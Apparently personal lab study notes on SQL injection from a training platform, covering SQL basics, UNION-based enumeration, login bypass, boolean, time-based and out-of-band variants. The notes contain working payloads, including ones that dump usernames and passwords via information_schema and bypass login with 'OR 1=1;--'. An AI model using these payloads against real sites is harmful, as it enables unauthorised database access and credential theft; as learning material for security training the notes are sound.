# SQL INJECTION

### 1. What is SQL?
- STRUCTURED QUERY LANGUAGE
##
### 2.What is SQLI?
- SQL Injection --> its nothing but the web-application cannot properly validate the user input ( sql commands inputted by the user ! ) and thus leading to access to the DATABASE
##
### 3. DATABASE?
- STORES DATA . THERE ARE 2 TYPES OF DB :
    - RELATIONAL --> IN FORM OF TABLE ( STRUCTURED)
    - NON-RELATIONAL --> NO TABLES ( UNSTRUCTURED)

##

- If you dont know the username , but think it starts from a, we can us the following query:
    - `SELECT * FROM USERS WHERE USERNAME LIKE 'A%'`
        - LIKE clause will give us all name starting from `A`

    - `select * from users where username like '%n';`
        - Here it gives names ending with `n`

    - `select * from users where username like '%mi%'`
        - returns rows where `mi` is found 
##
- UNION --> FOR COMBINING 2 TABLES WITH DIFFERENT ROWS/COLUMNS:
    - `SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`
##
- `INSERT` --> INSERTING VALUES INSIDE THE TABLE
    - `insert into users (username,password) values ('bob','password123');`
        - insert --> tells wanna insert into table
        - `into users` tells wanna insert inplace of usn and passwd
##

- `UPDATE`  
    - `update users SET username='root',password='pass123' where username='admin'`
##

- DELETE`
    - `delete from users where username='martin';` deletes `martin`
    - `delete from users` --> deletes all the data from table.
##


## SQLI 

- The URL u see in the website, are converted into sql query during the search 
- Lets take one example :
    - `https://website.thm/blog?id=1`
        - The blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

            - `SELECT * from blog where id=1 and private=0 LIMIT 1;`
                -  Here id number is 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.


- THERE ARE 3 TYPES OF SQLI 
    - IN-BAND
    - BLIND
    - OUT-BAND

##

## IN - BAND SQL INJECTION

- IN-BAND SQLI is the easiest type tp detect and exploit.

- `IN-BAND SQLI` --> You send a message (the exploit) through the website's URL or login box, and the secret data comes right back to you on that same screen.


- ` ERROR - BASED ` --> This crash the website and give Error, providing more details about DATABASE

- `UNION - SELECT ` --> Used to get the number of rows/columns !

- NOW LETS GET THROUGH SOME FUNCTION AND IMPORTANT TERMS :
    - `INFORMATION SCHEMA ` --> Its a metadata in DBMS which holds information about the  `tables` , `rows` , `coulmns`
        - MITIGATION :
            - Usually we cannot remove it as it is important for DB functioning and for protecting it we can give limited access to users so its not being mis-used

    ##    
    
    - `group_concat()` --> this is function which gives the results in form of columns( seperated by comma ) , rather than rows.
        - so when we are trying to get information such as rows , column from DB, if we dont use group_concat(), the DB will give result in row format, but sometimes DB are restricted to show only one row, hence we use this to get all results from row in one line

    ##

    - ` UNION operator`  has a strict rule: Both queries must have the exact same number of columns.
        - Imagine the original website's code is:
        - `SELECT title, date, content FROM posts WHERE id = 1 (That's 3 columns).`

        - If you type 1 UNION SELECT 1, the database sees:
            - Query A (3 columns) UNION Query B (1 column).
            - Error! "The used SELECT statements have a different number of columns."

        - If you type 1 UNION SELECT 1,2,3, the database sees:
            - Query A (3 columns) UNION Query B (3 columns).
            - Success! The numbers 1, 2, 3 are just "dummy data" we use to fill the slots until the error goes away.


    ##

- ### Phase 1: Detection (The "Break")
    - Action: Add a single quote (') to the end of the URL (e.g., id=1').
    - Goal: Trigger a syntax error.
    - Logic: If the page shows an error, it means your input is being executed as code by the database.
##
- ### Phase 2: Enumeration (The "Match")
    - Action: Keep adding numbers to a UNION SELECT statement until the error disappears.
    - 1 UNION SELECT 1 (Error)
    - 1 UNION SELECT 1,2 (Error)
    - 1 UNION SELECT 1,2,3 (Success!)
    - Goal: Find how many columns the original table has.
    - Logic: UNION only works if both the "Real" query and "Your" query have the same number of columns.
##
- ### Phase 3: Display Hijacking (The "Clear")
    - Action: Change the ID from 1 to 0 or -1.

    - 0 UNION SELECT 1,2,3

    - Goal: Make the real article disappear so only your data shows up on the screen.

    - Logic: The website only shows the first result. By making the real ID invalid ( ie id=1 to 0), your UNION results become the first (and only) result.
##
- ### Phase 4: Data Extraction (The "Dump")
    - Now, swap the numbers (1, 2, or 3) for actual commands:
    - WRITE ALL THESE COMMAND IN URL SECTION AFTER THE QUERY
    - Find DB Name: `0 UNION SELECT 1,2,database()`
        - Result: sqli_one
    - Find Tables: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
        - Result: article, staff_users

    - Find Columns: `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
        - Result: id, username, password

    - Steal Data: `0 UNION SELECT 1,2,group_concat(username,':',password) FROM staff_users`
        - Result: Martin's password.

##
- Quick Definitions for Review:
    - UNION: Glues two queries together.
    - information_schema: The database's "Table of Contents."

    - group_concat(): Squishes many rows into one line so it fits on your screen.

    - database(): A function that returns the name of the current database.
##

## Blind SQLi - Authentication Bypass

- Unlike in-band , where we get error displayed after the injection, in the BLIND SQLI the error may or may not be displayed , in this case most of the times the errors are disabled , but the injection still works regardless
##
- This can be implemented more in the LOGIN Pages, because for login page database, its job isnt to display or give anything , rather it just have to search if username matches the password, and if it does , `DB` says `YES` and lets the user in and the other way around
##
- PRACTICAL IMPLEMENTATION :
    - So , here the URL was : `https://website.thm/login`
    - On FrontEnd : 
        - ENTER USRNAME : 
        - ENTER PASSWORD :

    - Down below i could see the SQL comand : `select * from users where username='' and password='' LIMIT 1;`

    - Now the SQL command i needed to use for DB to give yes is as follows :
        - ` select * from users WHERE username = ' ' and password = ' ' OR 1=1;`
        - This first checks the usn and pass if its TRUE or FALSE, then it checks if `1=1` whichh is always true
        - so it returns a `YES`, So this was our SQL Payload 

    - SINCE ORIGINAL SQL : `select * from users where username='' and password='' LIMIT 1;`
    - When i tried writing my paylaod into login's usn or pass , it get filled into the ORIGINAL COMMAND'S usn and pass
    - so i did following payload:
        -  FIRST in username login thing , i wrote `--`
            - `--` COMMENTED EVERYTHING AFTER USERNAME
        - Then i wrote ` ' -- `, i put colon to close the username
        - then wro9te the remaing other command andd finally got the flag :
            - ` ' and password = ' ' OR 1=1;--`


## BLIND SQLI - BOOLEAN BASED

- Here based on TRUE/FALSE , 1/0 we have to continue with payloads
- SAME AS SQLI -> IN-BAND and BLIND-AUTH ( COMBO )

##  Blind SQLi - Time Based

- HERE THERE IS NO VISUAL NDICATOR LIKE TRUE OR FALSE

- WE HAVE TO CHECK IF OUR PAYLOAD IS SUCCESSFULL OR NO BASED ON THE `TIME-REQUEST`

- This time delay is introduced using built-in methods such as SLEEP(x) alongside the `UNION` statement.
- The `SLEEP()` method will only ever get executed upon a successful `UNION` SELECT statement. 

- Here we use , ` ' UNION SELECT SLEEP(5)` And after sleep we try other payloads as required to enumerate
- SO, how to know if payload is sucessfull or no? if its successfull then we can notice a 5 second delay and if not , there are no delays


#

## OUT OF BAND SQLI

- Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic

- OUT-OF BAND --> For this we need a listener on attacker side to gather data where data is exfiltered from DB via HTTP or DNS

- SO its as follows :
    - 1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

    - 2) The Website makes an SQL query to the database, which also passes the hacker's payload.

    - 3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.